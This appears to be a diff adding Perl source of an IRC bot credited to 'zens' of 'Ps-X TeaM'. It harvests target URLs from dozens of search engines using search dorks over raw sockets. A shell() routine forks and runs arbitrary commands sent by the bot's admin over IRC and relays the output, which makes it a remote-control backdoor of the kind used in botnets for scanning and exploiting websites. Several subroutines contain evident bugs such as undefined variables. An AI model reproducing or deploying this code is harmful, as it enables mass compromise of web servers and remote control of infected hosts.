+sub uol() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=1; $i<=1000; $i+=10) {
+        my $search = ("http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$i);
+        my $res = search_engine_query($search);
+        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
+            my $link = $1;
+            if ($link !~ /busca|uol|yahoo/) {
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub yahoo() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=1; $i<=500; $i+=1) {
+        my $search = ("http://www.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$i);
+        my $res = search_engine_query($search);
+        while ($res =~ m/26u=(.*?)%26w=/g) {
+            my $link = $1;
+            if ($link!~ /yahoo/){
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub sapo(){
+    my @list;
+    my $key = $_[0];
+    my $b   = 0;
+      for ($b=1; $b<=500; $b+=1) {
+        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".&key($key)."&st=local");
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
+            my $link = $1;
+            if ($link!~ /sapo/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub amidalla(){
+    my @list;
+    my $key = $_[0];
+    my $i   = 0;
+    for ($i=0; $i<=100; $i+=10){
+        my $web=("http://www.amidalla.de/cgi-bin/amisearch.cgi?search=".key($key)."&page=".$i."&break=10&af=2&tld=com&et=2");		
+        my $Res=search_engine_query($web);
+        while ($Res =~ m/<a href=\"http:\/\/(.+?)\//g){
+            if ($1 !~ /amidalla/){
+                my $k=$1;
+                my @grep=links($k);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub goocz() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ("http://www.google.cz/search?q=".key($key)."&num=100&filter=0&start=".$i);
+        my $res = search_engine_query($search);
+        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub gigablast() {
+    my @list;
+    my $key = $_[0];
+    for ($i = 0; $i <= 1000; $i += 10) {
+        my $giga = ("http://www.gigablast.com/search?s=".$i."&q=".key($key));
+        my $Res = search_engine_query($giga);
+        while ($Res =~ m/href=http:\/\/(.+?)><font/g) {
+            if ($1 !~ /gigablast/){
+	        my $k = $1;
+                my @grep = links($k);
+                push(@list, @grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub rediff() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100) {
+        my $search = ("http://search1.rediff.com/dirsrch/default.asp?MT=".&key($key)."&iss=&submit=Search&firstres=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"http:\/\/(.*?)\" onmousedown/g) {
+            my $link = $1;
+            if ($link !~ /search1|rediff/){
+		my @grep = &links($link);
+		push(@list,@grep);
+	    }
+        }
+    }
+    return @list;
+}
+
+sub ricerca() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=1; $i<=1000; $i+=10){
+        my $search = ("http://ricerca.virgilio.it/ricerca?qs=".key($key)."l&filter=1&site=&lr=&hits=10&offset=".$i);
+        my $res = search_engine_query($search);
+        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
+            my $link = $1;
+            if ($link !~ /virgilio|ricerca/){
+                $link =~ s/<//g;
+                $link =~ s/ //g;
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub kvasir() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=1; $i<=1000; $i+=10){
+        my $search = ("http://www.kvasir.no/nettsok?offset=".$i."&pageSize=10&q=".key($key));
+        my $res = search_engine_query($search);
+        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
+            my $link = $1;
+            if ($link !~ /kvasir/){
+                $link =~ s/<//g;
+                $link =~ s/ //g;
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub buscar() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=1; $i<=1000; $i+=10){
+        my $search = ("http://buscar.ozu.es/index.php?etq=web&q=".key($key)."&pag=".$i);
+        my $res = search_engine_query($search);
+        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
+            my $link = $1;
+            if ($link !~ /buscar/){
+                $link =~ s/<//g;
+                $link =~ s/ //g;
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub exalead() {
+  my @list;
+  my $key = $_[0];
+    for ($b=0; $b<=4000; $b+=100) {
+        my $search = ("http://www.exalead.com/search/web/results/?q=".&key($key)."&elements_per_page=100&start_index=".$b);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a class=\"thumbnail\" href=\"http:\/\/(.*?)\"/g) {
+            my $link = $1;
+            if ($link!~ /exalead/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+            }
+        }
+    return @list;	
+}
+
+sub excite(){
+    my @list;
+    my $key = $_[0];
+    my $i   = 0;
+    for ($i=0; $i<=1000; $i+=100){
+        my $web=("http://msxml.excite.com/excite/ws/redir/_iceUrlFlag=11?qcat=Web&amp;qkw=".key($key)."&amp;qcoll=relevance&amp;zoom=off&amp;bepersistence=true&amp;newtxn=false&amp;qi=41&amp;qk=20&amp;page=".$i."&amp;_IceUrl=true");		
+        my $Res= search_engine_query($web);
+        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+            if ($1 !~ /excite/){
+                my $k=$1;
+                my @grep=links($k);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub pagina(){
+    my @list;
+    my $key = $_[0];
+    my $i   = 0;
+    for ($i=0; $i<=100; $i+=1){
+        my $web=("http://startgoogle.startpagina.nl/index.php?q=".key($key)."&start=".$i."&origin=homepage&source=geentaal");		
+        my $Res= search_engine_query($web);
+        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+            if ($1 !~ /pagina|pagina's/){
+                my $k=$1;
+                my @grep=links($k);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub seznam(){
+    my @list;
+    my $key = $_[0];
+    for($i=1;$i<=300;$i+=10){#20
+      my $Lyc=("http://search.seznam.cz/?q=".key($key)."&from=".$i."&sourceid=web");
+      my $Res=search_engine_query($Lyc);
+      while($Res =~ m/<a href=\"http:\/\/(.+?)\/\" title=/g){
+         my $k=$1;
+         my @grep=links($k);
+         push(@list,@grep);
+     }
+   }
+   return @list;
+}
+
+sub clusty() {
+    my @list;
+    my $key = $_[0];
+    my $b   = 0;
+	for ($b=10; $b<=3000; $b+=10) {
+        my $search = ("http://search.yippy.com/search?query=".&key($key)."&input-form=clusty-simple&v:sources=webplus&v:state=root|root-".$b."-10|0&");
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<div class=\"document-header\"><a href=\"http:\/\/(.*?)\"><span class=\"title\">/g) {
+            my $link = $1;
+            if ($link!~ /yippy|clusty/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub interia() {
+    my @list;
+    my $key = $_[0];
+    for ($i = 0;$i<= 100; $i+= 10) {
+           my $search = ( "http://www.google.interia.pl/szukaj?q=".key($key)."&s=szukaj&w=sw&szukaj=&p=".$i);
+           my $res = &search_engine_query($search);
+           while ($res =~ m/text-decoration: none;\">http:\/\/(.+?)\/(.*)<\/a>/g) {
+                my $link = $1;
+                if ($link!~ /google|interia/) {
+                   my @grep=links($link);
+                   push(@list,@grep);
+           }
+       }
+   }
+  return @list;
+}
+
+sub tiscali(){
+  my @list;
+  my $key = $_[0];
+  for ($b=1; $b<=500; $b+=10) {
+       my $tisc=("http://search.tiscali.it/?tiscalitype=web&collection=web&start=".$b."&q=".key($key));
+       my $Res=query($tisc);
+       while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
+          my $k=$1;
+          if ($link!~ /search|tiscali/) {
+             my @grep=links($k);
+             push(@list,@grep);
+          }
+       }
+    }
+  return @list;
+}
+
+sub aol() {
+  my @list;
+  my $key = $_[0];
+    for ($b=2; $b<=300; $b+=1) {
+        my $search = ("http://aim.search.aol.com/aol/search?q=".&key($key)."&page=".$b);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/href=\"http:\/\/(.*?)\" property/g) {
+            my $link = $1;
+            if ($link!~ /aol\.com/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;	
+}
+
+sub snz() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=1; $i<=1000; $i+=100) {
+        my $search = ("http://searchnz.co.nz/search.aspx?q=".key($key)."&np=".$i);
+        my $res = search_engine_query($search);
+        while ($res =~ m/<a href=\"?http:\/\/(.+?)\//g) {
+            my $link = $1;
+            if ($link!~ /searchnz/){
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub gooes() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ("http://www.google.es/search?q=".key($key)."&num=100&filter=0&start=".$i);
+        my $res = search_engine_query($search);
+        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
+            my $link = $1;
+            if ($link !~ /google\.es/){
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub yause() {
+    my @list;
+    my $key = $_[0];
+    my $b   = 0;
+	for ($b=1; $b<=500; $b+=1) {
+        my $search = ("http://www.yauba.com/?query=".&key($key)."&where=websites&target=websites&con=y&ilang=english&clt=topic&pg=".$b);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<h1><a rel=\"nofollow\" href=\"http:\/\/(.*?)\" onfocus=/g) {
+            my $link = $1;
+            if ($link!~ /yauba|websites/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub walla() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=300; $i+=1) {
+        my $search = ("http://search.walla.co.il/?t=0&e=utf&q=".key($key)."&p=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<td class=sw><a href=\"http:\/\/(.*?)\//g) {
+            my $link = $1;
+            if ($link !~ /walla/) {
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub hotbot() {
+  my @list;
+  my $key = $_[0];
+    for ($b=0; $b<=50; $b+=1) {
+        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$b."&diktfc=51964BFDE35DFB6914F9E1E0D7988C3AC0ACB52B58BE");
+        my $res = &search_engine_query($search);
+		if ($res =~ m/had no web result/i) {$b=50;}
+        while ($res =~ m/rel=\"nofollow\" href=\"http:\/\/(.+?)\"/g) {
+            if ($1 !~ /hotbot\.com/){
+            my $link = $1;
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;	
+}
+
+sub rambler(){
+    my @list;
+    my $key = $_[0];
+    for ($b=0; $b<=50; $b++){
+        my $search=("http://nova.rambler.ru/srch?btnG=DtD?DaN?D?!&query=".key($key)."&page=".$i);
+        my $res= &search_engine_query($search);
+        while ($res =~ m/href=\"http:\/\/(.*)\"/g) {
+            my $link = $1;
+            if ($link!~ /rambler|nova|cache/ ){
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+   return @list;
+}
+
+sub yandex(){
+    my @list;
+    my $key = $_[0];
+    for ($b=0; $b<=50; $b+=10){
+        my $search=("http://yandex.ru/yandsearch?p=".$i."&text=".key($key)."&lr=84");
+        my $res= &search_engine_query($search);
+        while ($res =~ m/href=\"http:\/\/(.*?)\"/ig) {
+            my $link = $1;
+            if ($link!~ /yandex/ ){
+                my @grep = links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+   return @list;
+}
+
+sub dmoz() { 
+    my @list;
+    my $key = $_[0];
+    my $b   = 0;
+	for ($b=0; $b<=500; $b+=10) {
+        my $search = ("http://search.dmoz.org/search/search?q=".&key($key)."&start=".$b."&type=next&all=yes");
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
+            if ($1 !~ /search|dmoz/) {
+            my $link = $1;
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub szukacz(){
+    my @list;
+    my $key = $_[0];
+    for($b=0; $b<=500; $b+=10) {
+       my $search = ("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&enc=iso-8859-2&q=".key($key)."&start=".$b);
+       my $res = &search_engine_query($search);
+       while($res =~ m/<a title=\"?http:\/\/(.+?)\//g) {
+            my $link = $1;
+            if ($link !~ /szukacz\.pl/) {
+            my @grep= &links($link);
+            push(@list,@grep);
+       }
+    }
+ }
+return @lst;
+}
+
+###########################################################################
+#               X-cyb Edited By zens      Ps-X TeaM Network               #
+###########################################################################
+
+sub clean() {
+    my @cln = ();
+    my %visit = ();
+    foreach my $element (@_) {
+        $element =~ s/\/+/\//g;
+        next if $visit{$element}++;
+        push @cln, $element;
+    }
+    return @cln;
+}
+
+sub key() {
+    my $dork = $_[0];
+    $dork =~ s/ /\+/g;
+    $dork =~ s/:/\%3A/g;
+    $dork =~ s/\//\%2F/g;
+    $dork =~ s/&/\%26/g;
+    $dork =~ s/\"/\%22/g;
+    $dork =~ s/,/\%2C/g;
+    $dork =~ s/\\/\%5C/g;
+    return $dork;
+}
+
+sub links() {
+    my @list;
+    my $link = $_[0];
+    my $host = $_[0];
+    my $hdir = $_[0];
+    $hdir =~ s/(.*)\/[^\/]*$/\1/;
+    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+    $host .= "/";
+    $link .= "/";
+    $hdir .= "/";
+    $host =~ s/\/\//\//g;
+    $hdir =~ s/\/\//\//g;
+    $link =~ s/\/\//\//g;
+    push(@list,$link,$host,$hdir);
+    return @list;
+}
+
+sub search_engine_query() {
+    my $url = $_[0];
+    $url =~ s/http:\/\///;
+    my $host = $url;
+    my $query = $url;
+    my $page  = "";
+    $host =~ s/href=\"?http:\/\///;
+    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+    $query =~ s/$host//;
+    if ($query eq "") { $query = "/"; }
+        eval {
+            my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
+            print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";
+            my @pages = <$sock>;
+            $page = "@pages";
+            close($sock);
+        };
+    return $page;
+}
+
+###########################################################################
+#               X-cyb Edited By zens      Ps-X TeaM Network               #
+###########################################################################
+
+sub shell() {
+    my $path = $_[0];
+    my $cmd = $_[1];
+    if ($cmd =~ /cd (.*)/) {
+        chdir("$1") || &msg("$path","No such file or directory");
+        return;
+    }
+    elsif ($pid = fork) { waitpid($pid, 0); }
+    else { if (fork) { exit; } else {
+        my @output = `$cmd 2>&1 3>&1`;
+        my $c = 0;
+        foreach my $output (@output) {
+            $c++;
+            chop $output;
+            &msg("$path","$output");
+            if ($c == 5) { $c = 0; sleep 3; }
+        }
+        exit;
+    }}
+}
+
+sub isAdmin() {
+    my $status = 0;
+    my $nick = $_[0];
+    if ($nick eq $admin) { $status = 1; }
+    return $status;
+}
+
+sub msg() {
+    return unless $#_ == 1;
+    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
+}
+
+sub nick() {
+    return unless $#_ == 0;
+    sendraw("NICK $_[0]");
+}
+
+sub notice() {
+    return unless $#_ == 1;
+    sendraw("NOTICE $_[0] :$_[1]");
+}
+###########################################################################
+#                        Source Edit By zens                              #
+###########################################################################
